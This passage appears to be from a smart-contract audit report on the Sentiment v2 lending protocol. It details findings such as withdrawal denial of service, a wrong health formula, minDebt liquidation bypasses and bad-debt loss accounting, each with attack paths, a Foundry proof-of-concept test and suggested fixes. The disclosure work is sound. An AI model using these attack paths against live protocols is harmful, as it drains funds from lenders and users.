   @audit>> Revert >>  if (shares == 0) revert Pool_ZeroShareRedeem(poolId, assets);
```


NOTE -  OpenZeppelin  Math.sol round up only when the multiplication of the numerators are greater than 1 else 0 is still returned.

```solidity
  /**
     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.
     */
    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {
        uint256 result = mulDiv(x, y, denominator);
  
 @AUDIT>>     if (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) {
    
                   result += 1;
        }
        return result;
    }
```

If the calculated `shares` is zero due to precision loss, the function reverts, causing the entire withdrawal process in the SuperPool to fail.



## Impact
The inability to withdraw from the SuperPool, even when sufficient liquidity exists, can cause significant disruption for users. This DoS vulnerability can prevent users from accessing their funds.  

**FLOW** 

 Super pool A has 3 pools 1, 2 and 3.

Liquidity in each pool

                                               Superpool holds asset -- 30e18

assets + interest

                                               Pool 1 -  18.573457857309736565e18

                                               Pool 2 - 1.426542142690263434e18

                                               Pool 3 - 10e18

Total available asset in the pool -  59.999999999999999999e18.

User calls to withdraw - 50e18 of their asset in superppool.


We loop through each  Process- 

                           1. assets -= assetsInSuperpool;

assets = 20e18.

                              2.  assets -= withdrawAmt;

assets =1.426542142690263435e18

                              3.  assets -= withdrawAmt;
 
assets = 1



```solidity
  if (withdrawAmt > 0) {

      try POOL.withdraw(poolId, withdrawAmt, address(this), address(this))
```

 we attempt to withdraw this 1 wei.



                            **### _Pool 3._** 

```solidity

 function withdraw(
        uint256 poolId,
        uint256 assets,
        address receiver,
        address owner
    ) public returns (uint256 shares) {
        PoolData storage pool = poolDataFor[poolId];

        // update state to accrue interest since the last time accrue() was called
        accrue(pool, poolId);

        shares = _convertToShares(assets, pool.totalDepositAssets, pool.totalDepositShares, Math.Rounding.Up);
        // check for rounding error since convertToShares rounds down
        if (shares == 0) revert Pool_ZeroShareRedeem(poolId, assets);
-------------------------------------------------------------------------------------------

```



                         pool.totalDepositAssets = 18.9e18 ,

                         pool.totalDepositShares = 18.2e18 ,

                         assets= 1 wei.

                         Convert to shares = (1 * 18.2 e18)/ 18.9 e18 =  0.96296296296296296296296296296296= 0.

                         OpenZeppelin  Math.sol will not round to 1 because the answer is not greater than 0. thus this will revert.



**Also note** an attacker can also play with the asset in the Superpool by depositing dust amounts to ensure that the amount in the pool remains 1 wei at a point when we make external calls and cause a reversion. This is possible because we use address this to check the amount in the Superpool contract. 

## Code Snippet


https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L569-L573

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L350-L352

https://github.com/OpenZeppelin/openzeppelin-contracts/blob/dc44c9f1a4c3b10af99492eed84f83ed244203f6/contracts/utils/math/Math.sol#L139-L145

## Tool used

Manual Review

## Recommendation

To mitigate this issue, modify the catch block in the `_withdrawFromPools` function to check if the pool liquidity is greater than the amount to be collected. If so, collect the pool liquidity and transfer it to the user from the contract. This change ensures that even if precision loss occurs, the user can still withdraw the available liquidity. Here is the recommended modification:


```solidity

  // withdrawAmt cannot be greater than the underlying pool liquidity
            uint256 poolLiquidity = POOL.getLiquidityOf(poolId);
            if (poolLiquidity < withdrawAmt) withdrawAmt = poolLiquidity;

            if (withdrawAmt > 0) {
                try POOL.withdraw(poolId, withdrawAmt, address(this), address(this)) {
                    assets -= withdrawAmt;
                } catch {
++    if (poolLiquidity > withdrawAmt) {
++         withdrawAmt = poolLiquidity;
++    POOL.withdraw(poolId, withdrawAmt, address(this), address(this));
++    assets = 0;}

 }
            }
```
This adjustment will allow withdrawals to succeed even when precision loss leads to zero shares being calculated, thus preventing the DoS vulnerability.

--- 

# Issue M-15: Incorrect Calculation of `_minRequestedValue` Exposes Healthy Positions to Liquidation and Prevents Full Borrowing/Withdrawal 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/184 

## Found by 
A2-security
## Summary
The `_getMinReqAssetValue` function incorrectly calculates the minimum required asset value, leading to an overestimation of `minReqAssetValue`.

## Vulnerability Detail
- The protocol allows positions to use  multiple type of tokens (up to 5) as collateral. each collateral/pool have different **LTV** which is a percentage of the collateral value that can be borrowed.
- after each action done by a position we should check that the position is  healthy which is crucial check. 
- for a positon to be healthy we should check that the `minReqAssetValue` is less then the collateral value of that position.

```solidity
    function isPositionHealthy(address position) public view returns (bool) {
        // some code ... 
   >>   uint256 minReqAssetValue = _getMinReqAssetValue(debtPools, debtValueForPool, positionAssets, positionAssetWeight, position);
   >>   return totalAssetValue >= minReqAssetValue;
    }
```
```js

    function _getMinReqAssetValue(
        uint256[] memory debtPools,
        uint256[] memory debtValuleForPool,
        address[] memory positionAssets,
        uint256[] memory wt,
        address position
    ) internal view returns (uint256) {
        uint256 minReqAssetValue;

        // O(pools.len * positionAssets.len)
        uint256 debtPoolsLength = debtPools.length;
        uint256 positionAssetsLength = positionAssets.length;
        for (uint256 i; i < debtPoolsLength; ++i) {
            for (uint256 j; j < positionAssetsLength; ++j) {
                uint256 ltv = riskEngine.ltvFor(debtPools[i], positionAssets[j]);

                // revert with pool id and the asset that is not supported by the pool
                if (ltv == 0) revert RiskModule_UnsupportedAsset(position, debtPools[i], positionAssets[j]);

                minReqAssetValue += debtValuleForPool[i].mulDiv(wt[j], ltv, Math.Rounding.Up);
            }
        }
    }
```
- To compute the `minReqAssetValue` for a debt to be healthy. If we convert the function into its mathematical representation. It will be the equivalent to this (we are simplifing it by only taking the formula for a single debt pool)
Let:
- $DV = \text{debtValuleForPool}[0]$

- $DP = \text{debtPools}[0]$

- $\text{PAL} = \text{length of } \text{positionAssets}$

- $\text{positionAssets}[j] = PA_j$

- $wt[j] = w_j$

- $\text{ltvFor}(DP, PA_j) = ltv_j$

- $\text{minReqAssetValue} = \text{MAV}$

- $\lceil x \rceil$ denotes the ceiling function, rounding $x$ up to the nearest integer.

The function calculates $\text{MAV}$ as follows:

$$
\text{MAV} = \sum_{j=0}^{\text{PAL}-1} \left( \left\lceil \frac{DV \cdot w_j}{ltv_j} \right\rceil \right)
$$

1. First equation (how the code is currently implemented) could be simplified to this:
```math
   $$
   \text{MAV} = DV \times {\sum_{j=0}^{n} \frac{w_j}  {\text{ltv}_j}}
   $$
```
2. The above expression is not equal to the total value divided by the weighted average ltv (how it should be calculated):
```math
   $$
   \text{MAV} = \text{DV} \times \sum_{j=0}^{n} \frac{1}{ (\text{ltv}_j \times w_j)}
   $$
```
3. The summation:
```math
   $$
   \sum_{j=0}^{n} \frac{w_j}{\text{ltv}_j} = \frac{w_0}{\text{ltv}_0} + \cdots + \frac{w_n}{\text{ltv}_n}
   $$
```
4. This expression is not equal to:
```math
   $$
   \frac{1}{\text{ltv}_0 \times w_0 + \cdots + \text{ltv}_n \times w_n}
   $$
```
### Example : 
- let's explain the issue from an easy and logical perspective with the followign example : 
- Consider a user's position with the following characteristics:

  - Pool: `poolId-A`
  - Assets: 
    - asset-1: `100$ (LTV 90%)`
    - asset-2: `100$ (LTV 50%)`
  - Total collateral value: `200$`


- Logically,The maximum debt this user should be able to take from `poolId-A` is:

`(100$ * 90%) + (100$ * 50%) = 90$ + 50$ = 140$`

- If the user has borrowed 140$, the minimum required asset value to keep the position healthy should remain 200$.

- Now, let's see how the current implementation calculates this:
```js
for (uint256 j; j < positionAssetsLength; ++j) {
    uint256 ltv = riskEngine.ltvFor(debtPools[i], positionAssets[j]);
    minReqAssetValue += debtValuleForPool[i].mulDiv(wt[j], ltv, Math.Rounding.Up);
}
```
- for our case:

    - For asset-1: `140$ * 0.5 / 0.9 = 77.78$`
    - For asset-2: `140$ * 0.5 / 0.5 = 140$`
    - Total minReqAssetValue: `77.78$ + 140$ =` **`217.78$`**

-  The function calculates a minimum required asset value of `217.78$`, which is significantly higher than the actual minimum collateral required of `200$` for a position that should be considered healthy.

## Impact
- Position will be liquidated eventhough they are healthy which cause lose of funds for users unfairely.
- Users won't be able to borrow/withdraw funds to the maximum they are allowed to. Knowing that sentiment is a leveraged lending protocol by design, this represents a big issue
## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L250
## Tool used

Manual Review

## Recommendation
To fix this, the protocol needs to implement the correct formula by dividing the pool debt value by the weighted-averaged ltv

```diff
function _getMinReqAssetValue(
    uint256[] memory debtPools,
    uint256[] memory debtValuleForPool,
    address[] memory positionAssets,
    uint256[] memory wt,
    address position
) internal view returns (uint256) {
    uint256 minReqAssetValue;
-   uint256 weigtedAvgLtv;

    // O(pools.len * positionAssets.len)
    uint256 debtPoolsLength = debtPools.length;
    uint256 positionAssetsLength = positionAssets.length;
    for (uint256 i; i < debtPoolsLength; ++i) {
-       weigtedAvgLtv = 0;
+       uint256 weightedAvgLtv = 0;
        for (uint256 j; j < positionAssetsLength; ++j) {
            uint256 ltv = riskEngine.ltvFor(debtPools[i], positionAssets[j]);

            // revert with pool id and the asset that is not supported by the pool
            if (ltv == 0) revert RiskModule_UnsupportedAsset(position, debtPools[i], positionAssets[j]);

-           minReqAssetValue += wt[j].mulDiv(ltv,1e18, Math.Rounding.Up);
+           weightedAvgLtv += wt[j].mulDiv(ltv, 1e18, Math.Rounding.Down);
        }
-       minReqAssetValue += debtValuleForPool[i].mulDiv(1e18,weigtedAvgLtv,Math.Rounding.Up);
+       minReqAssetValue += debtValuleForPool[i].mulDiv(1e18, weightedAvgLtv, Math.Rounding.Up);
    }

    if (minReqAssetValue == 0) revert RiskModule_ZeroMinReqAssets();
    return minReqAssetValue;
}
```
Using this corrected implementation with the example:

For `poolId-A` with `140$` debt:
  - `weightedAvgLtv = (0.5 * 90%) + (0.5 * 50%) = 70%`
  - `minReqAssetValue = 140$ * (1 / 70%) = 200$`
  
This calculation correctly results in the expected minRequiredAssetValue of 200$.



## Discussion

**sherlock-admin3**

1 comment(s) were left on this issue during the judging contest.

**Nihavent** commented:
>  This is a great explanation of why the attacks in [299](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/299) and [558](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/558) are possible. If I'm not mistaken, this fix also prevents those attacks.



# Issue M-16: The liquidation will revert if the left amount in `debt < MIN_DEBT` 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/194 

## Found by 
A2-security
## Summary
This bug was firstl discovered in the Guardian Audit report H-17:Users Can Avoid Liquidations. The sponsor have marked this issue as resolved, and have asked fellow watsons to also check if all the issues from the guardian report, that were marked as resolved, have been fully mitigated. In this case, the bug still exists.

## Vulnerability Detail
At the end of liquidation, the pool.repay() function will be called
```js
@>    pool.repay(poolId, position, amt);
    // update position to reflect repayment of debt by liquidator
    Position(payable(position)).repay(poolId, amt);
}
```
The `repay()` function however still implements the same `MIN_DEBT` check, which will lead to the exact same scenario intended to be mitigated. 

```solidity
    function repay(uint256 poolId, address position, uint256 amt) external returns (uint256 remainingShares) {
---
        // revert if repaid amt is too small
        if (borrowShares == 0) revert Pool_ZeroSharesRepay(poolId, amt);

        // check that final debt amount is greater than min debt
        remainingShares = borrowSharesOf[poolId][position] - borrowShares;
        if (remainingShares > 0) {
            uint256 newBorrowAssets = _convertToAssets(
                remainingShares, pool.totalBorrowAssets - amt, pool.totalBorrowShares - borrowShares, Math.Rounding.Down
            );
@>            if (_getValueOf(pool.asset, newBorrowAssets) < minDebt) {
@>                revert Pool_DebtTooLow(poolId, pool.asset, newBorrowAssets);
@>            }
        }
```

## Impact
As Mentioned in the guardian report, this issue exposes the protocol of risk the accumulation of bad debt and liquidation reverting.
Please also notice, that the likeablity of this scenario increases the more unhealthy the position, leading to profitable liquidation attempts reverting. Also noting that sentiment is a leveraged lending protocol, the risk of the accumulation of such positions is significant
## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/Pool.sol#L482-L514
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/PositionManager.sol#L484-L500
3

## Tool used

Manual Review

## Recommendation
The simplest way to mitigate this, is to refactor the code in `repay()` to an internal `_repay()` function that recieves an extra force argument and to bypass this check if the this force value is set to true
```solidity
    function repay(uint256 poolId, address position, uint256 amt) external returns (uint256 remainingShares) {
        _repay(poolId,position,amt,false)
    }
```
```solidity
    function reduceDebt(uint256 poolId, address position, uint256 amt) external returns (uint256 remainingShares) {
        _repay(poolId,position,amt,true)
    }
```

# Issue M-17: Missing 'minDebt' check from liquidation can lead to bad debt accumulation 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/198 

## Found by 
AlexCzm
### Summary


The missing `minDebt` check from `PositionManager.liquidate` can leave positions with a small amount of debt that is unappealing to further liquidations and  can lead to accumulation of bad debt. 

### Root Cause

Protocol implements a `borrowAssets < minDebt` check in `Pool.borrow` ([link](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L452)) and `Pool.repay` ([link2](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L511)), but this check is missing from liquidations. 

### Internal pre-conditions

1. An unhealthy position must exist.

### External pre-conditions

none

### Attack Path

1. An liquidator/attacker observes an unhealthy positions and calls `PositionManager.liquidate` and repays just enough debt such that after liquidations  `0 < the new position's debt < minDebt`. 
2. After 1st liquidation position became sound with debt < assets deposited.
3. After some time, due to market conditions, same position became unhealthy again. But due to gas prices and small position the liquidators are disincentivized to liquidate it.  
4. Due to further asset's prices decrease, position accumulate bad debt and lenders must take a loss. 
Since the protocol can be deployed to Ethereum L1 small

### Impact

Protocol can have many positions with `debt < minDebt`. Over time, since there will be no incentive for liquidators to liquidate small underwater positions given the gas cost, protocol accumulates bad debt at the detrimental of lenders.

### PoC

_No response_

### Mitigation

Ensure that liquidators liquidate entire position's debt or, that the remaining debt after liquidation is bigger than `minDebt`. 

# Issue M-18: Liquidator will incur losses during liquidation leading to bad debt accumulation 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/201 

## Found by 
4gontuk
### Summary

The lack of handling for bad debt in `PositionManager.sol` will cause an economic disincentive for liquidators, leading to potential bad debt accumulation for the protocol as liquidators will avoid liquidating positions with insufficient collateral.


### Root Cause

In [`PositionManager.sol: _repayPositionDebt`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L484-L500) the function assumes full debt repayment by the liquidator without considering the available collateral.


### Internal pre-conditions

1. A position must have debt exceeding its collateral value.
2. The liquidator must attempt to liquidate the position.

### External pre-conditions

1. The value of the collateral must drop significantly, causing the debt to exceed the collateral value.

### Attack Path

1. A position's collateral value drops below its debt value.
2. A liquidator attempts to liquidate the position.
3. The liquidator is required to repay the full debt amount, which exceeds the collateral value.
4. The liquidator incurs a loss, making it economically unfeasible to proceed with the liquidation.
5. Liquidators avoid liquidating such positions, leading to bad debt accumulation in the protocol.


### Impact

The protocol suffers from bad debt accumulation as liquidators avoid liquidating positions with insufficient collateral, leading to potential financial instability.

### PoC

1. Assume a position has a debt of 1000 USDC and collateral worth 800 USDC.
2. The liquidator attempts to liquidate the position.
3. The liquidator is required to repay the full 1000 USDC debt.
4. The liquidator incurs a loss of 200 USDC (1000 USDC debt - 800 USDC collateral).
5. Liquidators avoid such liquidations, leading to bad debt accumulation.

### Mitigation

Modify the [`_repayPositionDebt` function](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L484-L500) to handle partial debt repayment based on available collateral. This ensures liquidators only repay what is economically feasible, preventing bad debt accumulation.

```diff
function _repayPositionDebt(address position, DebtData[] calldata debtData) internal {
    // sequentially repay position debts
    // assumes the position manager is approved to pull assets from the liquidator
    uint256 debtDataLength = debtData.length;
    for (uint256 i; i < debtDataLength; ++i) {
        uint256 poolId = debtData[i].poolId;
        address poolAsset = pool.getPoolAssetFor(poolId);
        uint256 amt = debtData[i].amt;
        uint256 positionDebt = pool.getBorrowsOf(poolId, position);

        // if the passed amt is type(uint256).max assume repayment of the entire debt
        if (amt == type(uint256).max) amt = positionDebt;

+       // calculate the maximum repayable amount based on the liquidator's balance
+       uint256 liquidatorBalance = IERC20(poolAsset).balanceOf(msg.sender);
+       uint256 repayAmount = amt > liquidatorBalance ? liquidatorBalance : amt;

-       // transfer debt asset from the liquidator to the pool
-       IERC20(poolAsset).safeTransferFrom(msg.sender, address(pool), amt);
-       // trigger pool repayment which assumes successful transfer of repaid assets
-       pool.repay(poolId, position, amt);
-       // update position to reflect repayment of debt by liquidator
-       Position(payable(position)).repay(poolId, amt);

+       // transfer debt asset from the liquidator to the pool
+       IERC20(poolAsset).safeTransferFrom(msg.sender, address(pool), repayAmount);
+       // trigger pool repayment which assumes successful transfer of repaid assets
+       pool.repay(poolId, position, repayAmount);
+       // update position to reflect repayment of debt by liquidator
+       Position(payable(position)).repay(poolId, repayAmount);

+       // handle remaining debt if any
+       if (repayAmount < positionDebt) {
+           // logic to handle remaining debt, e.g., updating records, notifying stakeholders, etc.
+       }
    }
}
```

# Issue M-19: Rounding Errors will Prevent Full Debt Repayment for Users 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/207 

The protocol has acknowledged this issue.

## Found by 
4gontuk
### Summary

Rounding down in the [`repay` function](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L482-L527) will cause an inability to fully repay debt for users as the function will leave a small amount of debt due to rounding down borrow shares.

### Root Cause

In [`protocol-v2/src/Pool.sol::repay`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L482-L527) the function rounds down the borrow shares to burn, which can leave a small amount of debt.

### Internal pre-conditions

1. User needs to have an outstanding debt in the pool.
2. User needs to call the `repay` function with an amount intended to fully repay the debt.


### External pre-conditions

None.

### Attack Path

1. User calls `getBorrowsOf` to determine the total debt.
2. User calls `repay` with the amount returned by `getBorrowsOf`.
3. The `repay` function rounds down the borrow shares to burn, leaving a small amount of debt.
4. User is unable to fully repay the debt due to the remaining borrow shares.


### Impact

The users cannot fully repay their debt, which can cause issues with the minimum debt requirement and prevent the removal of the debt pool from the user's debtPools array.

### PoC

1. User has a debt of 100.5 units in the pool.
2. User calls `getBorrowsOf` and gets a debt amount of 100.5 units.
3. User calls `repay` with 100.5 units.
4. The `repay` function rounds down the borrow shares, leaving 0.5 units of debt.
5. User is unable to fully repay the debt, causing issues with the minimum debt requirement.


### Mitigation

To fix the issue, the `repay` function should round up the borrow shares to burn when the user is repaying the entire debt.

### Code Fix:
```diff
function repay(uint256 poolId, address position, uint256 amt) external returns (uint256 remainingShares) {
    PoolData storage pool = poolDataFor[poolId];

    // ... existing code ...

    // compute borrow shares equivalent to notional asset amt
-   uint256 borrowShares = _convertToShares(amt, pool.totalBorrowAssets, pool.totalBorrowShares, Math.Rounding.Down);
+   uint256 borrowShares = _convertToShares(amt, pool.totalBorrowAssets, pool.totalBorrowShares, Math.Rounding.Up);

    // ... existing code ...
}
```

This change ensures that the `repay` function rounds up the borrow shares to burn, preventing the issue of leaving a small amount of debt due to rounding down. This will allow users to fully repay their debt without leaving any residual borrow shares.

# Issue M-20: All borrowed assest are deducted instead of LOSS leading to Improper Loss Calculation in Bad Debt Liquidation Leading to Significant User Losses 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/211 

The protocol has acknowledged this issue.

## Found by 
A2-security, Bigsam, X12
## Summary
The implementation of the `rebalanceBadDebt` function fails to correctly handle bad debt liquidation, leading to an inequitable distribution of losses among lenders. Instead of socializing the loss proportionally among all lenders, the function deducts the entire amount of borrowed shares from the pool, potentially causing a significant loss for users withdrawing from the Pool while SuperPool loses funds as more shares are burnt to receive less assets. This can result in a user losing 20% or more of the tokens they should receive.
_Docs-_

_### Bad Debt Positions_

**Bad debt positions positions include positions that owe more debt to the protocol than the total value of assets in the position.** The purpose of liquidating a bad debt position is to ensure the Base Pool is not rendered unusable due to accumulation of bad debt. Accordingly, these positions can only be liquidated by the protocol governance.

The process of liquidating a bad debt position involves socializing the bad debt across all lenders of the Base Pool proportional to their share of deposits. The protocol clears the debt owed by the bad debt position and **the loss is realized equitably among all lenders.**

## Vulnerability Detail

According to the protocol documentation, when liquidating a bad debt position, the loss should be socialized across all lenders in the Base Pool proportionally to their share of deposits. This ensures that no single user bears the entire loss and the Base Pool remains usable.

However, the current implementation of the `rebalanceBadDebt` function does not adhere to this principle. Instead, it deducts the entire amount of asset borrowed from the pool without considering the actual loss incurred. This behavior leads to a situation where a user who withdraws from the SuperPool immediately this function is called will receive significantly fewer tokens than they are entitled to and more of their shares will burnt, as the total deposit amount is reduced by the borrowed amount rather than the actual loss.



```solidity
function rebalanceBadDebt(uint256 poolId, address position) external {
    PoolData storage pool = poolDataFor[poolId];
    accrue(pool, poolId);

    // revert if the caller is not the position manager
    if (msg.sender != positionManager) revert Pool_OnlyPositionManager(poolId, msg.sender);

    // compute pool and position debt in shares and assets
    uint256 totalBorrowShares = pool.totalBorrowShares;
    uint256 totalBorrowAssets = pool.totalBorrowAssets;
    uint256 borrowShares = borrowSharesOf[poolId][position];
    // [ROUND] round up against lenders
    uint256 borrowAssets = _convertToAssets(borrowShares, totalBorrowAssets, totalBorrowShares, Math.Rounding.Up);

    // rebalance bad debt across lenders
    pool.totalBorrowShares = totalBorrowShares - borrowShares;
    // handle borrowAssets being rounded up to be greater than totalBorrowAssets
    pool.totalBorrowAssets = (totalBorrowAssets > borrowAssets) ? totalBorrowAssets - borrowAssets : 0;
    uint256 totalDepositAssets = pool.totalDepositAssets;

@audit>> we are reducing by totalborrowasset not LOSS>>   pool.totalDepositAssets = (totalDepositAssets > borrowAssets) ? totalDepositAssets - borrowAssets : 0;
    borrowSharesOf[poolId][position] = 0;
}
```


## Impact

This issue can lead to significant financial losses for users withdrawing from the SuperPool. As the total deposit assets are incorrectly reduced, users may lose a large portion of their tokens.
### Steps to Reproduce

1. A user deposits assets into the SuperPool.
2. Another user borrows a significant amount from the Base Pool.
3. The borrowed amount is not repaid, leading to a bad debt situation.
4. The `rebalanceBadDebt` function is called to liquidate the bad debt.
5. The function reduces the total deposit assets by the entire borrowed amount instead of the actual loss incurred.
6. The first user attempts to withdraw their assets from the SuperPool and receives significantly less than expected due to the incorrect deduction.


```solidity
// instead of reducing the total deposit by the loss we deduct the whole amount borrowed
    function testDepositBorrowLiquidateandWithdrawAssets() public { //uint96 assets
        uint96 assets1 = 200e18;
        testCanDepositAssets(assets1);

// initiall shares of user 200e18
        assertEq(pool.getAssetsOf(linearRatePool, user),200e18);

       
     // another user borrows 10e18 and his borrow ebters baddebt, loss of about 74% of the position. the debt was cleared but when user withdraws 100e18 all his shares is burnt because all the borrowed amount was deducted.   
         vm.startPrank(user);
        asset2.approve(address(positionManager), 100e18);
        asset3.approve(address(positionManager), 50e18);

        // deposit 1e18 asset2, borrow 1e18 asset1
        Action[] memory actions = new Action[](6);
        (position, actions[0]) = newPosition(user, bytes32(uint256(0x123456789)));
        actions[1] = deposit(address(asset2), 100e18);
        actions[2] = deposit(address(asset3), 50e18);

        actions[3] = addToken(address(asset2));
        actions[4] = addToken(address(asset3));
        actions[5] = borrow(linearRatePool, 100e18);
        // actions[4] = approve(address(mockswap), address(asset1), 1e18);
        // bytes memory data = abi.encodeWithSelector(SWAP_FUNC_SELECTOR, address(asset1), address(asset3), 1e18);
        // actions[5] = exec(address(mockswap), 0, data);
        // actions[6] = addToken(address(asset3));
        positionManager.processBatch(position, actions);
        vm.stopPrank();
        assertTrue(riskEngine.isPositionHealthy(position));

        // (uint256 totalAssetValue, uint256 totalDebtValue, uint256 minReqAssetValue) = riskEngine.getRiskData(position);

        // assertEq(totalAssetValue, 150e18);
        // assertEq(totalDebtValue, 100e18);
        // assertEq(minReqAssetValue, 111.1111111111111110001e18);

        // construct liquidator data
        DebtData memory debtData = DebtData({ poolId: linearRatePool, amt: type(uint256).max });
        DebtData[] memory debts = new DebtData[](1);
        debts[0] = debtData;
        AssetData memory asset1Data = AssetData({ asset: address(asset3), amt: 50e18 });
        AssetData memory asset2Data = AssetData({ asset: address(asset2), amt: 100e18 });
        AssetData[] memory assets = new AssetData[](2);
        assets[0] = asset1Data;
        assets[1] = asset2Data;

        // modify asset2 price from 1eth to 0.1eth
        FixedPriceOracle pointOneEthOracle = new FixedPriceOracle(1e16);
        vm.prank(protocolOwner);
        riskEngine.setOracle(address(asset2), address(pointOneEthOracle));
         vm.stopPrank();
        assertFalse(riskEngine.isPositionHealthy(position));

         // modify asset2 price from 1eth to 0.1eth
        FixedPriceOracle pointtwoEthOracle = new FixedPriceOracle(5e17);
        vm.prank(protocolOwner);
        riskEngine.setOracle(address(asset3), address(pointtwoEthOracle));
         vm.stopPrank();
        assertFalse(riskEngine.isPositionHealthy(position));

        (uint256 totalAssetValue2, uint256 totalDebtValue2, uint256 minReqAssetValue2) = riskEngine.getRiskData(position);

        assertEq(totalAssetValue2, 26e18);
        assertEq(totalDebtValue2, 100e18);
        assertEq(minReqAssetValue2, 111.111111111111111001e18);

       

        // liquidate
        vm.startPrank(protocolOwner);
        asset1.approve(address(positionManager), 100e18);
        positionManager.liquidateBadDebt(position);
        vm.stopPrank();

        vm.prank(user);
        pool.withdraw(linearRatePool, 100e18, user, user);

        assertEq(pool.getAssetsOf(linearRatePool, user), 0);
        assertEq(pool.balanceOf(user, linearRatePool), 0);


        assertEq(asset1.balanceOf(user), 100000000000000000000);

// even if admins tries to swap and redeposit this token back there is a big risk here 
// 1. contract can be paused  
// 2. the deposit inflates the deposited shares and the loss to the user remains the same

    }
```

## Code Snippet

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L528-L549

## Tool used

Manual Review

## Recommendation



Even if Admin batches a call to clear bad debt and swap the asset gotten and redeposit into the pool we should note that pools can be paused to prevent deposits but withdrawals, and bad debt clearing can't be stopped.  hence it is safe to account for this appropriately and transfer the swapped funds back to the pool. 

To correctly socialize the loss among all lenders, modify the `rebalanceBadDebt` function to calculate the actual loss and distribute it proportionally among all lenders. 

### Proposed Solution

1. Calculate the loss in ETH: `loss = ETH value of borrowed asset - ETH value of total deposit`.
2. Determine the loss per lender by dividing the loss by the total borrowed asset in ETH.
3. Multiply the result by the total borrowed asset in token decimals to get the actual loss to be subtracted.
4. Update the `rebalanceBadDebt` function to include a new variable for the loss and adjust the total deposit assets accordingly.

Here’s a conceptual example of the modification:

```solidity
uint256 loss = (totalBorrowAssetsInETH - totalDepositAssetsInETH);
uint256 lossInToken = (loss * totalBorrowAssetsInTokenDecimals) / totalBorrowAssetsInETH;

```

This change will ensure that the loss is equitably realized among all lenders, preventing a significant and unfair loss to any single user.

# Issue M-21: Small loans can extend the TVL of any position up to 90% 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/215 

## Found by 
X12
## Summary
Users can exploit the `minDebt` feature to extend their LTV up to 90% for risky assets.

## Vulnerability Detail
The system uses a `minDebt` threshold to ensure that positions are profitable for liquidation. Loans below this amount may not be profitable to liquidate, as liquidators would incur gas fees, increasing their costs.

The [repay](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L506-L514) function checks if the borrowed amount is below `minDebt` and reverts the TX if it is.

```solidity
        remainingShares = borrowSharesOf[poolId][position] - borrowShares;
        if (remainingShares > 0) {
            uint256 newBorrowAssets = _convertToAssets(
                remainingShares, pool.totalBorrowAssets - amt, pool.totalBorrowShares - borrowShares, Math.Rounding.Down
            );
            if (_getValueOf(pool.asset, newBorrowAssets) < minDebt) {
                revert Pool_DebtTooLow(poolId, pool.asset, newBorrowAssets);
            }
        }
```

Liquidators also cannot seize the entire position. They are limited to a maximum of `debt repaid * 1e18 / 0.9e18`, which is 11% more than what they have to repay. That's their profit.

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskModule.sol#L156-L159

```solidity
        uint256 maxSeizedAssetValue = debtRepaidValue.mulDiv(1e18, (1e18 - discount));
        if (assetSeizedValue > maxSeizedAssetValue) {
            revert RiskModule_SeizedTooMuch(assetSeizedValue, maxSeizedAssetValue);
        }
```

Users combine the above 2 mechanics and game the system by taking small loans that prevent liquidators from fully liquidating their position due to the `minDebt` limit, while also making partial liquidation unprofitable.

**Example:**
1. A WETH pool has risky collateral - token X with an LTV of 50%.
2. Alice opens a position with collateral X valued at 0.05 ETH (equal to `minDebt`).
3. She borrows 0.25 WETH from the pool.
4. The asset’s price drops, increasing her LTV to 55%.

Alice won’t be liquidated because any liquidation attempt would leave her position below `minDebt`, causing the transaction to revert. Liquidators must wait until her LTV reaches 90% to perform a full liquidation (~0.045 debt, for 0.05 col). 

Alice can also avoid paying her debt, as the risky asset might very well quickly cross the gap between 90% and 100% and make her position insolvent, causing bad debt. She can abuse this on chains with low fees (ARB, BASE, OP) and create multiple position borrowing from the pool.

## Impact
The core LTV mechanism is broken. Users can leverage risky assets with high LTV, increasing the system’s exposure to bad debt.

## Code Snippet
```solidity
        uint256 maxSeizedAssetValue = debtRepaidValue.mulDiv(1e18, (1e18 - discount));
        if (assetSeizedValue > maxSeizedAssetValue) {
            revert RiskModule_SeizedTooMuch(assetSeizedValue, maxSeizedAssetValue);
        }
```

## Tool Used
Manual Review

## Recommendation
Allow liquidators to fully liquidate a position if the remaining value is less than `minDebt`.

